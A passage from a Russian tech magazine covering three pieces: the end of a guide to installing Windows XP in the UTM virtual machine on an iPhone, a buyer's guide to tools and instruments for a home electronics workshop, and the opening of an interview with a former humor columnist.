ваем содержимое ZIP-архива и переносим его в какую-нибудь папку на Яндекс
Диске. После этого нужно установить приложение Яндекс Диск на iPhone
из официаль ного App Store.
   Теперь запускаем на телефоне стан дартное приложение «Файлы», перехо-
дим на экран «Места» и перед вигаем вправо перек лючатель «Яндекс.Диск»,
чтобы содержимое облачного диска отображалось  в этом  приложении.
Переходим в папку, в которую мы сохранили виртуаль ную машину, долгим
тапом копиру ем ее в буфер обмена, затем переходим в локацию «На iPhone →
UTM» и еще одним долгим нажатием вставляем папку с виртуалкой в эту
дирек торию. Чтобы нем ного ускорить процесс, можно сначала отыскать эту
папку в приложении Яндекс Диск, нажать и удерживать ее значок, затем в ниж-
ней панели нажать кнопку  «...» и выбрать в открывшемся меню пункт
«Добавить в офлайн». Вуаля, наша виртуаль ная машина теперь доступна
на главном экране UTM, можно запускать!





         Установка виртуаль ной машины с помощью Яндекс Диска


ÓÑÒÀÍÎÂÊÀ ÎÑ ÈÇ ÄÈÑÒÐÈÁÓÒÈÂÀ

Напоследок я решил самостоятель но установить на виртуаль ную машину
какую-нибудь операционную систему. Выбор пал на Windows XP: она мень ше
всего требователь на к ресурсам, а памяти в моем телефоне, прямо скажем,
кот наплакал. С заг рузочным образом я поступил в точности так же, как опи-
сывал выше: скопировал файл .iso на Яндекс Диск, а потом перенес его
в папку «На iPhone → UTM» в приложении «Файлы».
   У меня очень долго не получалось запустить установку — всякий раз вир-
туалка выдавала ошибку No bootable device, а сам процесс настройки на сайте
производителя UTM прак тически никак не докумен тирован, поэтому под -
ходящей инструк ции я не нашел. Победу удалось одержать после череды
эксперимен тов. При создании виртуаль ной машины я выбирал этот образ
в окне Drives/Images, нажав + в правой верхней части экрана, затем нажимал
кнопку Path, снова + и Import.





                 Под ключение дистрибутива в UTM

Оказалось, что таким образом следует создавать виртуаль ный жесткий диск —
нажав +, нужно восполь зовать ся кнопкой Create и затем ввести имя и объем
диска. А съем ный диск под ключает ся хит рее: выбрав интерфейс IDE, нужно
включить тум блер Removable. В разделе Drives/Images появит ся два диска —
один созданный нами толь ко что вин честер с задан ным объемом и Removable
Drive. Не забудь тапнуть по над писи Save в верхней части окна, иначе вир-
туаль ная машина не запом нит изменен ные настройки.





                 Под ключение дистрибутива в UTM

После этого, запустив виртуаль ную машину, в панели управления нужно нажать
на кнопку с изображением ком пакт-диска, затем тапнуть по названию съем -
ного диска. Нажми кнопку Change и выбери образ диска с дистрибутивом
в папке UTM на iPhone, после чего нажми Done справа вверху. Перезапусти
виртуаль ную машину — установка операционной системы начнется автомати-
чески.





              Установка Windows XP в виртуаль ной машине





                     Резуль тат эксперимен тов

Ура, мы установили вин ду на айфон!


ÂÛÂÎÄÛ

С помощью инстру мен тов для различных операционных систем в составе UTM
можно создавать общие папки в виртуалке и на хостовой ОС для перемещения
и копирования файлов (найти их можно в том же разделе Gallery на сайте раз-
работ чика). Теоретически это позволяет поработать в виртуаль ной машине,
скажем, в Microsoft Oﬃce, а потом сохранить созданные докумен ты на устрой-
стве.
  Но это теоретически. На прак тике же проект UTM чрезвычайно плохо
докумен тирован, операционная система в виртуаль ной машине жут ко тор-
мозит и лагает, а во время установки Windows XP я с десяток раз любовался
на BSOD и перепробовал кучу дистрибутивов, пока наконец не нашел один
рабочий. Да и сама виртуалка периодически вылетает с внут ренней ошибкой,
причины которой остаются тайной за семью печатями. Просто ошибка, и все.





                            Ой, ашипка!

Да, если в настройках виртуаль ной машины ты некоррек тно указал аппарат ную
кон фигурацию, например выбрал объем памяти близкий к доступному объему
оперативки твоего устройства, iOS просто молча зак роет UTM безо всяких
церемоний. Ни предупреждений, ни сообщений, вообще ничего.
  Попут но я собрал огромную коллекцию скрин шотов с BSOD’ами запущен -
ной на виртуаль ной машине Windows XP, даже уловил некоторую закономер-
ность: запускаем виртуалку с вин дой, вставляем в айфон шнур заряд ки, вытас-
киваем шнур заряд ки — BSOD. А иног да это слу чалось и вовсе без видимой
причины. Последний раз я видел подобный глюкод ром примерно 27 лет назад,
ког да Windows 95 на моей 486SX без каких-либо предупреждений валилась
в «синий экран» сама по себе примерно раз в полчаса.
  В сухом остатке получается, что работать с тек стами в онлайновом редак -
торе вроде Oﬃce 365 или Google Docs на iPad нам ного удобнее и приятнее,
чем городить огород с виртуаль ными машинами, а для игр на iPhone есть эму -
ляторы под iOS. Но я все же надеюсь, что со временем проект UTM будет
доведен до ума, виртуаль ные машины станут работать стабиль нее и быстрее,
а сам продукт снабдят под робной и понят ной докумен тацией.
GEEK





            ВЫБИРАЕМ ИНСТРУМЕНТЫ,
            ПРИБОРЫ И РАСХОДНИКИ
                   ДЛЯ ДОМАШНЕЙ
                      МАСТЕРСКОЙ





Если ты в кур се, за какую сто рону паяль-
ника дер жаться, зна ешь, чем отли чает ся
при пой от запоя, и понима ешь, для чего
слу жит канифоль, поз драв ляем — ты элек -
трон щик. Самое время обустро ить мас-           Candidum                                                                                         duospirit@gmail.com
тер скую, что бы нужные инстру мен ты всег -
да были под рукой. В этой статье под -
робно  расска жем,  что  имен но  тебе
понадо бит ся, дадим цен ные советы, какие
при боры, матери алы и расходни ки при -
обрести для домаш ней лабора тории.




                      Эта статья рас счи тана на читателя, уже зна комо-
                         го с основами электроники, ее мож но рас смат -
                        ривать как рас ширенный сборник тезисов. Если
                       тебя заинтересовала электроника и ты задумал -
                       ся об орга низа ции мас терской, но не зна ешь, что
                      нуж но при обрести  в первую очередь, то эта
                        статья для тебя. Начина ющим, которые только
                         хотят научиться паять, мы можем посоветовать
                       сна чала прочитать статью « Время паять! Под -
                      бира ем инс тру менты и осва иваем искусс тво пай -
                        ки ».



ÏÀßËÜÍÈÊ

Про паяль ники я уже писал в предыду щей статье, однако хочет ся добавить
еще несколь ко вещей. Паяль ники можно разделить на две категории — с мед -
ным и с никелирован ным жалом. В последнем слу чае оно необязатель но будет
мед ным. Паяль ники с мед ным жалом могут быть как простейшие с них-
ромовым наг ревателем, например ЭПСН, так и более наворочен ные с керами-
ческим. В целом керамический наг реватель более надежный, но стоит дороже.
   У паяль ника с мед ным жалом есть одно неоспоримое преиму щество: паять
им проще, и в этом плане он очень хорош для обу чения. На этом, пожалуй,
преиму щества закан чиваются (не считая цену). А вот недостатков у него гораз-
до боль ше, и почти все они связаны с тем, что мед ное жало надо время
от времени под готавливать к работе, а имен но под тачивать его и залуживать.
Обычно это делают с помощью напиль ника: жалу придают желаемую форму
(чаще всего напоминающую шлицевую отвертку), после чего сразу тщатель но
залуживают.





               Заточен ное и залужен ное мед ное жало

Зачищать от нагара все жало не имеет смысла, достаточно обточить и залудить
толь ко рабочую поверхность. Однако со временем заточка будет портить ся,
а жало обгорать: канифоль обуг ливается на жале, медь окисляет ся воздухом,
а рабочая поверхность жала растворяет ся в припое (растворяет ся не то чтобы
очень быстро, но замет но). Перег рев жала и исполь зование агрессивных флю-
сов (ортофосфорная кислота, хлорид аммония, соляная кислота с хлоридом
цин ка) здорово ускоряют выгорание жала.





                    Обгоревшее жало

Если верить олд скуль ным советам, то жало лучше не обрабаты вать напиль -
ником, а отковывать молот ком, тог да заточка держится доль ше. Но посколь ку
перед отковкой жало нужно обязатель но вынуть из паяль ника, то поль зуют ся
этим методом ред ко: из застарелого паяль ника ЭПСН жало не так уж часто
удается вынуть без фаталь ных последствий. В любом слу чае при активном
исполь зовании под тачивать его придет ся раз в пару дней.
  А если все так плохо, в чем же удобство и простота? Да в том, что для под -
готовки к работе засорившегося и выгоревшего жала достаточно сделать
два-три движения напиль ником, мак нуть его в канифоль и припой. С никеле-
выми все хит рее, но об этом ниже.
   Дру гой недостаток простых паяль ников (не толь ко с мед ным жалом) —
это перег рев: от него и мед ные жала выгорают быстрее, и канифоль обуг лива-
ется, и, что самое неприят ное, дорожки от платы отслаивают ся. Как с этим
бороть ся? Проще всего правиль но под бирать мощность паяль ника под выпол-
няемые работы. Для распайки мелочовки типа резисторов 0,125 Вт достаточ-
но 25-ват тного паяль ника, для более крупных деталей типа резисторов 2–5 Вт,
силовых тран зисторов и подобного уже нужно ватт сорок. А для лам повой тех-
ники и все пять десят с лиш ним.
  Но такой под ход не всег да удобен, посколь ку часто приходит ся паять
и мелочовку, и силовые элемен ты. Тут можно пойти на неболь шую хит рость
и приколхозить к паяль нику простейшую регулировку мощности. Проще всего
исполь зовать дим мер, можно и самый дешевый, так как мощность паяль ника
мизерная.
  А если денег нет даже на пиво, можно (как мы в институт ско-общажную
быт ность) исполь зовать вместо дим мера диод и параллель но ему — кон -
денсатор. Диод без кон денсатора слиш ком силь но снижает мощность, кон -
денсатор без диода требует ся достаточно боль шой емкости, а вот вместе
они — то, что надо. Емкость кон денсатора можно выбрать поряд ка 1–5 мкФ,
в пару к нему подойдет диод 1N4007, найти и то и дру гое можно прак тически
везде.
  В общем и целом, если устранить перег рев, работать мед ным жалом лег ко
и приятно. Правда, в 2022 году колхозить регулировку мощности паяль нику
можно толь ко из любви к искусству или в очень суровых жизненных обсто-
ятель ствах.
  Поэтому перейдем к акту аль ным решениям. Если ты планиру ешь паять
регулярно, в том числе SMD-ком понен ты, то стоит сразу брать паяль ник
с никелирован ным жалом и регулировкой тем перату ры. Регулировка позволяет
и мелочовку не перег ревать, и вжарить посиль нее, например ког да надо
заменить элек тролиты на материн ской плате, или паять шины в лам повых схе-
мах. Посколь ку никель не растворяет ся в припое, никелирован ные жала
не надо под тачивать, поэтому жало может быть любой удобной формы и не
будет дег радировать.
  Но есть здесь и свои нюан сы: никелирован ное жало надо постоян но дер-
жать чистым, залужен ным и смочен ным припоем, в противном слу чае оно
окислится и его придет ся лудить. А вот лудить никелирован ные жала гораздо
сложнее, чем мед ные, и исполь зовать напиль ник тут не вариант.
  Никелирован ные жала рекомен дует ся чистить влажной губкой из вискозы.
Смачивать губку лучше не водой, а глицерином, так она не высыхает и чистит
лучше (глицерин работает как флюс). В запущен ных слу чаях помогает акти-
вирован ная канифоль или активный паяль ный жир, после чего жало нужно
потереть о густо залужен ную оплетку.
  Вообще говоря, активные флюсы таким жалам не рекомен дованы, но если
этим делом не злоупот реблять, то и проблем не будет. В качестве паяль ника
могу порекомен довать GS90D, в нем исполь зуют ся смен ные жала. Кроме
того, паяль ник имеет терморегу лятор и солид ный запас мощности — 90 Вт.
Таким паяль ником, просто меняя жала, можно и SMD припаять, и лам повый
усилок собрать.





                         GS90D

Из минусов можно упомянуть разве что чересчур массивную ручку. Так же стоит
прикупить набор девятисотых жал для него, благо они достаточно дешевые.





                          Набор жал


ÏÀßËÜÍÀß ÑÒÀÍÖÈß

Если говорить о паяль ных стан циях, то можно посмотреть на один из клонов
LUKEY, например такой.





               Паяль ная стан ция под девятисотые жала

Эта обойдет ся подороже, но бонусом к ней идет фен и под ставка. Здесь так же
исполь зуют ся девятисотые жала. Еще удобнее паяль ные стан ции с жалами
T12, где жало, наг реватель и термодат чик собраны в виде единого девайса.
Такое решение очень быстро разог ревается, примерно за 30 с: очень удобно,
и к этому быстро привыкаешь, как ко всему хорошему.





                  Паяль ная стан ция под жала T12

Очень удобная шту ка, смело могу рекомен довать. Докупить еще пяток жал
разного размера под разные задачи, и будет то, что надо. Лично мне приш лись
по вку су жала T12-BC2 и T12-BC3, первое под SMD, а второе для крупных
деталей.





                        Набор жал T12


ÏÐÈÏÎÉ

Припоев существу ет великое множество под разные задачи, однако чаще все-
го радиолюбители исполь зуют ПОС61 и ПОС63. ПОС расшифровывается
как припой оловян но-свин цовый, а цифра — это процен тное содержание оло-
ва. Это тот самый слу чай, ког да следует под держать отечествен ного произво-
дителя.
  Покупая наш ПОС61, можно быть уверен ным, что это имен но ПОС61, а не
ПОС40, кроме того, он дешевле. Почему на это стоит обратить внимание?
Дело в том, что ПОС61 близок к эвтектике олово/свинец и потому застывает
в узком диапазоне тем ператур. Тог да как, например, ПОС40 будет застывать
в интервале тем ператур, причем сначала будет вык ристаллизовы вать ся чистый
свинец, а в кон це застынет эвтектика. На прак тике это неудобно тем, что, пока
припой застывает, соединение нель зя шевелить, иначе оно будет непрочным.
  ПОС40 застывает доль ше и более чувствителен к шевелению спаиваемого
соединения, это раздражает. Китайцы норовят под разбавить припой свин цом
из соображений экономии, поэтому, покупая безымян ные припои в хозмаге
или на «Алиэкспрессе», лег ко нарвать ся имен но на такой.
   У китайцев есть и нормаль ные припои, они обычно имеют синюю этикет ку
и стоят дороже нашего, соот ветству ющего ГОСТ. Ниже фотог рафии плохих
и хороших припоев. Начнем с плохих.





                    Плохой китайский припой 1





                    Плохой китайский припой 2

А теперь хорошие.





                     Хороший китайский припой





                   Хороший отечествен ный припой

Не пойми меня неправиль но: паять-то можно любым припоем, но хорошим
это делать приятнее и лег че. Что же касается бессвин цовых припоев, то
в домаш ней мастерской это бессмысленное пижонство. Единствен ное пре-
иму щество бессвин цового припоя — отсутствие в его составе вред ного свин -
ца, в осталь ном он усту пает свинецсодержащим.


ÑÏËÀÂÛ ÂÓÄÀ È ÐÎÇÅ

Су ществу ет два любопыт ных сплава: Ву да и Розе. Интересны они тем, что пла-
вят ся ниже тем перату ры кипения воды, при 60 и 94 градусах соот ветствен но.
В радиолюбитель ской прак тике они удобны для щадящего выпаивания боль -
ших SMD-мик росхем: их баналь но наносят паяль ником на выводы с избытком
и, держа в расплавленном состоянии, демон тиру ют элемент.
  После этого остается тщатель но удалить оплеткой эти сплавы, и можно
запаивать новый элемент. Как это делается, глянь на YouTube. Этот прием при-
меняют, ког да нужно выпаять массивный элемент из многослойной платы.




                   В спла ве Вуда 12,5% кад мия, поэтому он ток-
                         сичен. Не  ртуть, конеч но, но тоже при ятного
                        мало: может вызвать рак. Спла вы Вуда и Розе
                      содержат сви нец, а  он, как извес тно, совсем
                       не  витамин.  Кроме  того,  там  есть  вис мут.
                    По идее, он тоже дол жен быть токсичен, одна ко
                         у него плохо с биодос тупностью, поэтому он луч -
                   ше свинца, зато вис мут немножко фонит. Короче,
                      будь вни мателен и осторожен.


В сети встречают ся рекомен дации лужения плат сплавами Вуда и Розе, однако
делать этого не рекомен дует ся: с залужен ных таким образом плат при силь -
ном наг реве могут отваливать ся детали. Об этом была неплохая статья на хаб-
ре.


ÑÂÅÐËÀ

Казалось бы, а тут-то о чем писать? Сверла — они и в Африке сверла. Однако
и тут есть нюанс. Стек лотек столит очень мерзотный материал, он быстро тупит
сверла, а ког да приходит ся сверлить отверстия тонь ше 0,8 мм, острота сверла
становит ся очень важна.
  И тут нам на помощь приходят твердосплавные сверла. Стек лотек столит им
нипочем, однако они очень хрупкие. Закупать ся стоит с запасом, благо стоят
они недорого.





                   Набор твердосплавных сверл




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИGEEK




             ВЫБИРАЕМ ИНСТРУМЕНТЫ, ПРИБОРЫ И
         РАСХОДНИКИ ДЛЯ ДОМАШНЕЙ МАСТЕРСКОЙ





ÌÓËÜÒÈÌÅÒÐ

Муль тиметр, без преувеличения, основной прибор в лаборатории радиолю-
бителя. Маст  хэв, так сказать. Стрелочные приборы в настоящее время
исполь зуют или аристократы эстеты, или люди привычки, поэтому приобретать
их, пожалуй, смысла нет, разве что под какие-то специаль ные задачи. Циф-
ровые же муль тимет ры сейчас встречают ся повсеместно, и, в прин ципе, они
достаточно точные.
   Вот, например, классический прибор из 2000-х: DT-832, в целом он нор-
маль ный, но на сегод няшний день мораль но устарел. Кроме того, по моим
наблюдениям, ему не нравят ся импуль сные помехи, из-за которых он начинает
показы вать чушь.





                      Леген дарный DT-832

Вместо него в 2022 году лучше взять что-то типа Richmeters 101 или AN8008.
Последний чуть современ нее, притом обойдет ся это удоволь ствие примерно
в 1000 рублей.





                              Richmeters 101





                           AN8008

Они и точнее по сравнению с DT-832, и к импуль сным помехам устойчивы,
а кроме того, имеют под свет ку, что очень удобно. Не так давно появились
муль тимет ры с автовыбором режима измерения. Фиш ка приколь ная и может
быть даже полезна, ког да поль зуешь ся ред ко, а вот при постоян ном исполь -
зовании силь но раздражает. Кроме того, в некоторых моделях защита входа
слабая, и если ткнуть таким муль тимет ром в высокое напряжение, то высока
вероятность прибор убить. Однажды один такой у меня кон чился при настрой-
ке лам пового приемника.





             Муль тиметр с автосменой режимов измерений

Поэтому для повседневного исполь зования я подобную технику не рекомен -
дую. Чуть дороже обойдет ся модель с кнопочным перек лючением диапазонов.
В прин ципе, это удобно: можно управлять прибором одной рукой, но за такой
девайс придет ся выложить уже 2000 рублей.





           Муль тиметр с перек лючением диапазонов кнопками

Точности этих приборов на первых порах хватит с запасом. Так что переп-
лачивать за прецизионные приборы боль шого смысла нет.


ÓÍÈÂÅÐÑÀËÜÍÛÉ ÒÅÑÒÅÐ ÄÅÒÀËÅÉ

Простая, но крайне полезная приблуда, которая автоматически определяет тип
и  проверяет  работоспособность  радиодеталей:  тран зисторов  (полевых
и биполярных), кон денсаторов, резисторов, диодов и индуктивностей. Аппарат
прост в обращении и крайне удобен, ищет ся по запросу «MG328» или «уни-
версаль ный тестер деталей».
   Универсаль ные  тестеры  бывают  с  питанием  от  батарейки  «Крона»
или литий-полимерного акку мулятора (правда, в последнем слу чае китайцы
обычно впаивают держатель батареи формата AA вместо более популяр-
ного 18650, но это лег ко исправляет ся). Акку муляторный вариант мне боль ше
по душе. Цена вопроса — около 1000 рублей.





              Универсаль ный тестер радиодеталей MG328

Даже не знаю, как я рань ше без него обходился.


ËÎÃÈ×ÅÑÊÈÉ ÀÍÀËÈÇÀÒÎÐ

Логический анализатор — незаменимая шту ка при настройке цифровых
интерфейсов и отладке «в железе». С его помощью можно под ключить ся
к шине (SPI, I2C и подобным) и посмотреть, что там творит ся, а это уже
половина дела. Тут нет особого смысла гнать ся за наворочен ными устройства-
ми, во всяком слу чае, на первое время можно взять самый деш ман ский клон
Saleae Logic — в нынеш них ценах это примерно 500 рублей.





                          Клон Saleae Logic

Оригиналь ное же устройство обойдет ся примерно в эту же сум му, но уже
в долларах. Что же касается софта, то его можно скачать бесплат но с офи-
циаль ного сайта.





                                  Logic 1.x

Так же существу ет свобод ная аль тернатива — проект sigrok . Обе софтины под -
держивают декодирование протоколов и прочие полезные фиш ки.


ÎÑÖÈËËÎÃÐÀÔ

Если ты планиру ешь занять ся элек троникой сколь ко-нибудь серь езно, то очень
скоро осознаешь, что тебе просто необходим осциллог раф. Этот прибор, мож-
но сказать, глаза радиолюбителя. Прибор универсаль ный, крайне облегчает
настройку и ремонт аппарату ры.
  Осциллог рафы бывают двух видов: аналоговые и цифровые. На сегод -
няшний момент цифровые прак тически вытеснили аналоговые и стали де-фак -
то стан дартом. Однако у аналоговых приборов есть как минимум одна фича:
отсутствие эффекта стробоскопирования. Этот эффект наг лядно продемонс-
трирован в следующем видео. Поэтому смот реть амплитуд но-модулирован -
ный сиг нал на цифровом осциллог рафе не всег да удобно, однако это сугубо
аналоговые заморочки.
  В осталь ном цифровые осциллог рафы превосходят аналоговые, особен но
в том, что касается импуль сных и цифровых сиг налов. Например, рассмот реть
единичные пакеты дан ных на цифровой шине с помощью аналогового
осциллог рафа вряд ли удастся, тог да как для цифрового это элемен тарная
задача. Так же сиг нал можно сохранить и рассмот реть более под робно,
про скрин шоты я уже молчу.
   Кроме  того,  цифровые  осциллог рафы  обычно  позволяют  выполнять
математическую обработ ку сиг нала, например анализ спек тра. Поэтому раз-
мышлять над вопросом, брать аналоговый или цифровой прибор, долго
не придет ся: тут все как с описан ными выше тестерами. Для типичных сов-
ремен ных цифровых задач, вроде наблюдения так тового сиг нала, ШИМ-сиг -
нала, пакетов дан ных цифровых интерфейсов, цифровой прибор — оптималь -
ное решение.
  В качестве бонуса цифровые осциллог рафы имеют более широкую полосу,
стоят силь но дешевле аналоговых собрать ев и занимают на столе мень ше
места. Что же касается кон крет ных моделей, могу порекомен довать очень
популярный у радиолюбителей «народ ный» осциллог раф Hantek DSO5102P.
На мой вкус — оптималь ное соот ношение цены и качества. Обойдет ся он при-
мерно в 15 000 рублей.





                            Hantek DSO5102P

Впрочем, этот прибор уже понем ногу устаревает. Возможно, стоит посмотреть
на более свежие модели, они часто имеют дополнитель ные фун кции (нап-
ример, встроенный ГСС, анализатор цифровых протоколов) и бывают даже
дешевле.
  Не советую брать осциллог раф в виде приставки к компь ютеру (например,
Hantek 6022): он работает, но в обращении неудобен. Софт, прямо скажем,
кривоват,  а  управлять ся  с мыш кой  во  время ремон та  или  настройки
какой-нибудь платы — такое себе занятие. То ли дело род ные и привычные
«кру тилки» и кнопочки, поэтому рекомен дую брать полнофун кциональ ные
независимые устройства.
   Что же касается портативных осциллог рафов, то покупать их в качестве
основного прибора не стоит. Да, они дешевле, но, как и в слу чае с приставка-
ми, интерфейсу не хватает удобства. Зато, если рассмат ривать их как при-
боры, которые можно прихватить с собой, это то, что надо.
   Вот, например, Hantek 2D42 — это прямо швейцарский армейский нож: тут
тебе и муль тиметр, и осциллог раф, и ГСС. В обращении не так удобен,
как старшие стационарные собратья, зато его можно сунуть в сум ку и знать,
что  у тебя с собой полный ком плект приборов. Цена составляет око-
ло 8000 рублей.





                              Hantek 2D42

Что же касается аналоговых приборов, если ты знаешь, зачем оно тебе надо,
то тут в пору задумать ся о приобретении осциллог рафа с рук или на барахол-
ке — там можно найти приличный прибор тысяч за пять.


ÃÑÑ

ГСС — генератор стан дартных сиг налов, или фун кциональ ный генератор.
Это уже более специфический прибор, который тем не менее очень полезен
при настройке аналоговой техники, особен но приемников и передат чиков.
В ком плек те с осциллог рафом он позволяет лег ко и непринужденно диаг -
ностировать и настраивать аналоговую аппарату ру.
   Вот, например, недурная модель FY6800. Генерирует меандр, синус, пилу
и дру гие сиг налы с частотой до 60 МГц, позволяет получить два сиг нала
с задан ным сдвигом фаз. А еще умеет генерировать ШИМ и оборудован
встроенным частотомером.





                            FY6800

Прибор не то чтобы обязатель ный, особен но на началь ном этапе, но в хозяй-
стве полезный. Цена вопроса около 7000 рублей.


À×ÅÕÎÌÅÒÐ

Еще более специфический прибор, пред назначен ный для получения амплитуд -
но-частотных харак теристик филь тров и усилителей. Конечно, имея осциллог -
раф и ГСС, можно получить АЧХ, однако это пот ребу ет целого ряда изме-
рений. При наличии же специализирован ного прибора АЧХ можно наблюдать
в реаль ном времени, что удобно при настройке филь тров и трак тов УПЧ.
   Боль шую популярность у радиолюбителей снискал прибор NWT200. Эта
самая популярность была настоль ко велика, что DL4JAL, автор linNWT — соф-
тины для работы с NWT200, удалил ее со своего сайта. Видимо, надоело отве-
чать на вопросы, почему очеред ной китайский клон не под держивает ся.
  Тем не менее прог рамма доступна на GitHub, и Войтек Каневский (Wojtek
Kaniewski) портировал ее на Qt5, за что ему боль шое спасибо.





                         NWT200





                             LinNWT4

Цена вопроса — примерно 7000 рублей.


ÁËÎÊ ÏÈÒÀÍÈß

Ну и напоследок рассмот рим лабораторный блок питания. Как говорит ся, здо-
ровое питание всему основа. Шту ка эта весь ма полезная, особен но удобна
возможность ограничивать мак сималь ный  ток. Она вполне может спасти
устройство от переполюсовки или смяг чить последствия ошибки в схеме. Сто-
ят «лабораторники» сейчас недорого — от 2 до 4 тысяч рублей.





                 Типичный лабораторный блок питания

Разумеется,  есть варианты подешевле. Недурной блок питания выходит
из компь ютерного. В нем есть 3,3, +/–5, +/–12 В — в общем, самые ходовые
напряжения. Есть даже защита от КЗ. Так что отрезаем разъемы, ставим на их
месте клем мы, вык лючатель между черным и зеленым проводами, и готово.
Дешево и сердито, с возможностью двухполярного питания.





                 Переделан ный компь ютерный БП

Выг лядит такой блок страш нень ко, но работает уже не первый год без нарека-
ний. На фото внизу стоит завод ской лабораторник. В целом они друг дру га
неплохо дополняют.
  На этом, пожалуй, можно остановить ся. Нель зя объять необъятное, тем
более в одной статье. Перечисленного оборудования вполне достаточно, что-
бы начать карь еру в качестве специалиста по элек тронике. А все недостающее
можно будет прикупить уже в процессе. Желаю удачи на твоем творческом
пути!
GEEK





           ВЫЯСНЯЕМ
         У ДАНИ ШЕПОВАЛОВА,
       ГДЕ ОН ПРОПАДАЛ 20 ЛЕТ
        И ПРИ ЧЕМ ТУТ ГУСИ




Не подумай, это не шут ка: Даня Шепова -
лов,  ког да-то  писав ший  тер моядер ные
креати вы  для ран него  «Хакера», после
мно голет него   ски тания   воз вра щает ся
к исто кам. Но на этот раз — в чуть более       Андрей Письменный                                                                                      Главный редактор
серьезной  роли:  Даня  будет  брать         apismenny@gmail.com
для «Хакера» интервью у выда ющихся лич -
ностей. Одна ко мы прек расно понима ем,
что у читателей накопи лась куча воп росов
к нему самому. Так что нулевым спи кером
выступит сам Даня и расска жет о бур ной
молодости и о том, как судьба сло жилась
после «Хакера».





— Êàê ïîëó÷èëîñü, ÷òî òâîè òåêñòû ñòàëè ïîÿâëÿòüñÿ â «Õàêåðå»?
Òû ñàì òóäà ïðèøåë èëè òåáÿ ïîçâàëè?
— Я в 1996 году стал выходить во всякие сети: BBS, FIDO, эхокон ферен ции.
Через гейты с FTP софт качал, а-ля Quake десятью архивами в течение суток.
Потом нормаль ный интернет появился, где веб уже был. Интернет, правда,
дорогой диалапный: под ключился, быстро зашел куда-то, потыкал, скачал,
отключаешь ся и смот ришь в офлайне уже. Я изу чил HTML, сделал неболь шой
сайт, посвящен ный компь ютерному юмору. Не на danya.ru (этот домен я
в 2001-м толь ко догадался купить), а просто где-то у провайдера страничка
с тиль дой в URL была. Ког да стал наполнять его, сначала вык ладывал перево-
ды типа Bastard Operator From Hell, а потом, думаю, не тырить же чужие
материалы! А как же авторские права? (Это в 1997-то году в России такая
мысль возникла, во времена уличных развалов пират ских дисков. Сейчас
смеш но вспоминать. Меня, видимо, в нашу страну под кинули.) Поэтому решил
писать сам и там публиковать. Тог да алгорит мы поисковиков были не такими
изощренны ми, как сейчас. Я изу чил основы поисковой оптимизации, опти-
мизировал, и в итоге мой сайт был на первых строчках в выдаче по словам
«компь ютерный юмор». Ког да Син тез собирал коман ду «Хакера», он, навер-
ное, ввел «компь ютерный юмор» в Яндексе, нашел мой сайт и написал мне
на почту: хочешь, говорит, вести рубрику юмора в новом журнале? Я ответил:
«Почему бы нет?» Вот так как-то сразу и пош ло. Ну а потом эта рубрика пос-
тепен но мутировала во что-то шизофреническое.


— Ãäå è íà êîãî òû ó÷èëñÿ? ×åì â òå âðåìåíà óâëåêàëñÿ?
— Санкт-Петербург ский государствен ный элек тротехнический университет
(ЛЭТИ). Факуль тет компь ютерных технологий и информатики. Прик ладная
математика. Дипломная работа называлась «Разработ ка генетического алго-
рит ма поиска квазиоптималь ных путей в сложном графе». А пока учился,
в основном интересовался компь ютерной графикой, посколь ку увлекался
демосценой, ходил на демопати ENLiGHT, качал дем ки The Black Lotus и про-
чих. В одной из курсовых работ по компь ютерной графике вручную на C++
реализовы вал модели освещения Фон га, Гуро, Лам берта, нормали к полиго-
нам рассчитывал и торы зеленые кру тил мат рицей поворота, все как положено.
Какие-то вставки даже ассем блерные были, чтоб побыстрее кру тилось, это я
у демосценеров под тырил. Меня, конечно, поражало, как они под ходят к опти-
мизации кода и ресурсов, там у них была своя атмосфера. Потом экспор-
тировал объекты из 3D Max в свой формат и уже кру тил что угод но, черепа нап-
ример. Собствен но, и сейчас занимаюсь компь ютерной графикой, но уже
на уровне креативных идей, сценариев и работы с моушен-дизайнерами,
художниками, саунд-дизайнерами. Кстати, со мной в одной группе учился
Дима Бородин, создатель php.spb.ru . Многие PHP-прог раммисты в начале
нулевых учились по его сайту и стать ям. Он в какой-то момент силь но упорол-
ся по PHP и свалил из универа, чтобы ничто не отвлекало, а нам тем временем
всякие алгорит мы про списки и графы продолжили рисовать на доске.


— Êîãäà òû îòïðàâëÿë ïåðâûé òåêñò, áûëà óâåðåííîñòü, ÷òî åãî
îïóáëèêóþò? Èëè áûëè ñîìíåíèÿ?
— Я, если честно, не пом ню. Пом ню, как впервые увидел опубликован ную
статью. Собирался в универ, подошел к мет ро «Черная речка», там был киоск
с журналами. Вижу тот самый первый номер. Купил его, заценил дорогую глян -
цевую бумагу, классный дизайн. И тут же мое имя написано и мой текст
напечатан. Я был вообще в шоке. Думаю: «Ни хрена себе, как бывает, вол-
шебная сила интернета к чему привела!» То есть меня это поразило.


— Íî íà ñàìîì äåëå ó òåáÿ áûëî ïîíèìàíèå, ÷òî òâîè òåêñòû —
ñðåäè ñàìûõ ïîíÿòíûõ â æóðíàëå äëÿ ìíîãèõ êóïèâøèõ åãî?
— В самом первом номере — вряд ли, там еще все просто было. А даль ше,
конечно, пош ли статьи про дизассем блер и прочий безум ный треш от каких-то
красноглазых людей. А тут про сись ки что-то, понят ное дело, любому человеку
будет ближе.


— Äàâàé ïîñòàðàþñü ìÿãêî è êîððåêòíî çàäàòü âîïðîñ. Íóæíî ëè
áûëî âõîäèòü â îñîáîå ñîñòîÿíèå, ÷òîáû ðàáîòàòü íàä òåêñòàìè,
êîòîðûå òû ïèñàë â «Õàêåð»?
— Нет, не нужно. Я все тек сты писал абсолют но трезвым и сосредоточен ным.
Даже без чая и без кофе. Просто садился за комп и ловил какой-то кураж.


— Èìåííî êóðàæ ÿ è èìåë â âèäó, êîíå÷íî æå.
— Да, что-то такое было, какой-то веселый образ, аль тер эго.


— ×òî òîãäà íðàâèëîñü èç êíèã, èãð è ïðî÷åãî?
— Из книг — много всего. Рань ше читал художествен ную литературу самую
разную. Сейчас в основном нон-фик шен. Если вспоминать старые игры, то
MDK, Space Quest 6, Larry 7, Dune  II, X-Com: Terror From the Deep, Red Alert,
Warcraft, Starcraft, Doom, Quake, Carmageddon. Весна, солнце, друзья зовут
на улицу в «квад рат» играть, а я говорю, не могу, окна заш торил и фигачу
в Dune  II. Ког да купил карту 3dfx Voodoo Banshee, с ней Turok поставлялся,
это был отвал баш ки визу аль но! Первый раз увидел игру с 3D-чипом. Играл,
по-моему, два дня без сна непрерывно. Half-Life и Fallout, разумеется. Еще из
